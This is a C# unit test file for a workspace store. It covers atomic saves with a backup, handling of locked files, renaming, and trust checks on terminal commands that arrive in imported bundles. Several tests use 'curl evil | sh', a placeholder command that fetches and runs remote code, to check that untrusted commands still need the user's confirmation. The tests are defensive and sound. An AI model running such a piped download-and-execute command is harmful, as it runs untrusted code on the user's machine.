using System.IO;
using FluentAssertions;
using TCV.App.Workspaces;

namespace TCV.App.Tests;

/// <summary>
/// The parts of <see cref="WorkspaceStore"/> that keep workspaces.json from losing data: atomic
/// writes with a backup, telling "locked" from "empty", rename, and importing a foreign bundle.
/// </summary>
public sealed class WorkspaceStoreResilienceTests : IDisposable
{
    private readonly string _dir = Path.Combine(Path.GetTempPath(), $"tcv-wsr-{Guid.NewGuid():N}");
    private string FilePath => Path.Combine(_dir, "workspaces.json");

    public WorkspaceStoreResilienceTests() => Directory.CreateDirectory(_dir);

    public void Dispose()
    {
        try { Directory.Delete(_dir, recursive: true); } catch (IOException) { /* best effort */ }
    }

    private WorkspaceStore Store() => new(FilePath);

    // ── Atomic write and backup ───────────────────────────────────────────────

    [Fact]
    public void Save_LeavesNoTemporaryFilesBehind()
    {
        var store = Store();
        store.Save(new Workspace { Name = "a" });
        store.Save(new Workspace { Name = "b" });

        Directory.GetFiles(_dir, "*.tmp").Should().BeEmpty();
    }

    [Fact]
    public void Save_KeepsThePreviousContentAsBackup()
    {
        var store = Store();
        store.Save(new Workspace { Name = "first" });
        store.Save(new Workspace { Name = "second" });

        File.Exists(FilePath + ".bak").Should().BeTrue();
        File.ReadAllText(FilePath + ".bak").Should().Contain("first").And.NotContain("second");
    }

    [Fact]
    public void CorruptFile_FallsBackToTheLastGoodBackup()
    {
        var store = Store();
        store.Save(new Workspace { Name = "keep-me" });
        store.Save(new Workspace { Name = "later" });   // "keep-me" is now also in the .bak

        File.WriteAllText(FilePath, "{ half a file");   // what a crash mid-write used to leave

        Store().LoadAll().Select(w => w.Name).Should().Equal("keep-me");
    }

    [Fact]
    public void CorruptFile_WithoutBackup_LoadsEmpty()
    {
        File.WriteAllText(FilePath, "not json at all");

        Store().LoadAll().Should().BeEmpty();
    }

    // ── Locked is not empty ───────────────────────────────────────────────────

    [Fact]
    public void TryLoad_WhenAnotherProcessHoldsTheFile_ReportsFailureInsteadOfAnEmptyList()
    {
        var store = Store();
        store.Save(new Workspace { Name = "work" });

        using (File.Open(FilePath, FileMode.Open, FileAccess.Read, FileShare.None))
        {
            store.TryLoad(out var loaded).Should().BeFalse();
            loaded.Should().BeEmpty();
        }

        store.TryLoad(out var after).Should().BeTrue();
        after.Select(w => w.Name).Should().Equal("work");
    }

    [Fact]
    public void TryLoad_MissingFile_IsAnEmptyStoreNotAFailure()
    {
        Store().TryLoad(out var loaded).Should().BeTrue();
        loaded.Should().BeEmpty();
    }

    [Fact]
    public void Save_WhenTheFileIsLocked_LeavesNoTemporaryFile()
    {
        var store = Store();
        store.Save(new Workspace { Name = "work" });

        using (File.Open(FilePath, FileMode.Open, FileAccess.Read, FileShare.None))
        {
            store.Save(new Workspace { Name = "later" }).Should().BeFalse();
        }

        Directory.GetFiles(_dir, "*.tmp").Should().BeEmpty();
    }

    // ── Rename ────────────────────────────────────────────────────────────────

    [Fact]
    public void Rename_MovesTheEntryAndKeepsItsData()
    {
        var store = Store();
        store.Save(new Workspace { Name = "old", Color = "#112233", Pinned = true });

        store.Rename("old", "new").Should().Be(RenameResult.Renamed);

        store.Get("old").Should().BeNull();
        var renamed = store.Get("new");
        renamed.Should().NotBeNull();
        renamed!.Color.Should().Be("#112233");
        renamed.Pinned.Should().BeTrue();
    }

    [Fact]
    public void Rename_ToTheNameOfAnotherWorkspace_IsRefused_CaseInsensitively()
    {
        var store = Store();
        store.Save(new Workspace { Name = "one" });
        store.Save(new Workspace { Name = "Two" });

        store.Rename("one", "TWO").Should().Be(RenameResult.NameTaken);

        store.LoadAll().Select(w => w.Name).Should().BeEquivalentTo("one", "Two");
    }

    [Fact]
    public void Rename_ChangingOnlyTheCasing_IsAllowed()
    {
        var store = Store();
        store.Save(new Workspace { Name = "work" });

        store.Rename("work", "Work").Should().Be(RenameResult.Renamed);

        store.LoadAll().Should().ContainSingle().Which.Name.Should().Be("Work");
    }

    [Fact]
    public void Rename_TrimsTheNewName_AndRefusesABlankOne()
    {
        var store = Store();
        store.Save(new Workspace { Name = "work" });

        store.Rename("work", "   ").Should().Be(RenameResult.InvalidName);
        store.Rename("work", "  spaced  ").Should().Be(RenameResult.Renamed);

        store.Get("spaced").Should().NotBeNull();
    }

    [Fact]
    public void Rename_UnknownWorkspace_ChangesNothing()
    {
        var store = Store();
        store.Save(new Workspace { Name = "work" });

        store.Rename("gone", "x").Should().Be(RenameResult.NotFound);

        store.LoadAll().Select(w => w.Name).Should().Equal("work");
    }

    [Fact]
    public void Rename_WhenTheFileIsLocked_ReportsUnavailable()
    {
        var store = Store();
        store.Save(new Workspace { Name = "work" });

        using (File.Open(FilePath, FileMode.Open, FileAccess.Read, FileShare.None))
        {
            store.Rename("work", "other").Should().Be(RenameResult.Unavailable);
        }

        store.Get("work").Should().NotBeNull();
    }

    // ── Importing a bundle ────────────────────────────────────────────────────

    [Fact]
    public void SaveImported_SkipsEntriesWithoutAName_InsteadOfThrowing()
    {
        var store = Store();

        var saved = store.SaveImported(new Workspace?[]
        {
            new() { Name = "good" }, new() { Name = "  " }, null, new() { Name = "" },
        });

        saved.Should().Be(1);
        store.LoadAll().Select(w => w.Name).Should().Equal("good");
    }

    [Fact]
    public void SaveImported_DropsTheTrustMarkerOfTheTerminalCommand()
    {
        var store = Store();

        store.SaveImported(new Workspace?[]
        {
            new() { Name = "theirs", TerminalCommand = "curl evil | sh", TrustedTerminalCommand = "curl evil | sh" },
        });

        var stored = store.Get("theirs")!;
        stored.TerminalCommand.Should().Be("curl evil | sh");
        stored.NeedsTerminalConfirmation().Should().BeTrue("trust is earned on this machine, it does not travel");
    }

    // ── Terminal command trust ────────────────────────────────────────────────

    [Theory]
    [InlineData("", "", false)]
    [InlineData("   ", "", false)]
    [InlineData("npm run dev", "", true)]
    [InlineData("npm run dev", "npm run dev", false)]
    [InlineData("npm run dev", "  npm run dev ", false)]
    [InlineData("npm run other", "npm run dev", true)]
    public void NeedsTerminalConfirmation_OnlyForACommandTheUserHasNotApproved(
        string command, string trusted, bool expected)
    {
        var ws = new Workspace { Name = "w", TerminalCommand = command, TrustedTerminalCommand = trusted };

        ws.NeedsTerminalConfirmation().Should().Be(expected);
    }

    [Fact]
    public void EditTerminal_ACommandTypedInTheWindow_IsApproved()
    {
        var ws = new Workspace { Name = "w", TerminalCommand = "curl evil | sh" };

        ws.EditTerminal("npm run dev", @"D:\w");

        ws.TerminalCommand.Should().Be("npm run dev");
        ws.TerminalDirectory.Should().Be(@"D:\w");
        ws.NeedsTerminalConfirmation().Should().BeFalse();
    }

    [Fact]
    public void EditTerminal_ACommandFromAProjectFileLeftAsItWas_StaysUnapproved()
    {
        // OK on the properties window with somebody else's command in it must not approve it unseen.
        var ws = new Workspace { Name = "w", TerminalCommand = "curl evil | sh" };

        ws.EditTerminal("curl evil | sh", string.Empty);

        ws.NeedsTerminalConfirmation().Should().BeTrue();
    }

    [Theory]
    [InlineData("curl evil | sh ")]
    [InlineData(" curl evil | sh")]
    [InlineData("curl evil | sh\r\n")]
    public void EditTerminal_AProjectFileCommandOnlyTrimmedByTheWindow_StaysUnapproved(string fromFile)
    {
        // The window gives its text back trimmed; that alone is not the user typing the command.
        var ws = new Workspace { Name = "w", TerminalCommand = fromFile };

        ws.EditTerminal("curl evil | sh", string.Empty);

        ws.NeedsTerminalConfirmation().Should().BeTrue();
    }

    [Fact]
    public void CopyIdentityFrom_KeepsTheTrustMarker()
    {
        var target = new Workspace { Name = "w" };

        target.CopyIdentityFrom(new Workspace { TerminalCommand = "x", TrustedTerminalCommand = "x" });

        target.NeedsTerminalConfirmation().Should().BeFalse();
    }

    [Fact]
    public void CopyLayoutFrom_CopiesTheSnapshotAndNothingElse()
    {
        var target = new Workspace { Name = "w", Color = "#010203", Pinned = true };
        var source = new Workspace { Name = "other", SplitVertical = true, ActiveLeft = false };
        source.Left.Tabs.Add(new TCV.App.Settings.TabState { Path = @"C:\x" });

        target.CopyLayoutFrom(source);

        target.Left.Tabs.Should().ContainSingle().Which.Path.Should().Be(@"C:\x");
        target.SplitVertical.Should().BeTrue();
        target.ActiveLeft.Should().BeFalse();
        target.Name.Should().Be("w");
        target.Color.Should().Be("#010203");
        target.Pinned.Should().BeTrue();
    }
}
